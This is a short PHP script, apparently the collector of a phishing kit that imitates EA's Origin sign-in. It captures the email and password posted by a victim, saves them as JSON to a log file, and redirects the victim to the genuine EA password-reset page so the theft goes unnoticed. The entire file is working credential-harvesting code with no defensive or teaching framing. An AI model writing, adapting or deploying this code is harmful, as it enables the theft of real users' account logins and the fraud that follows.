<?php

header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
$data = array('site' => 'Origin',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>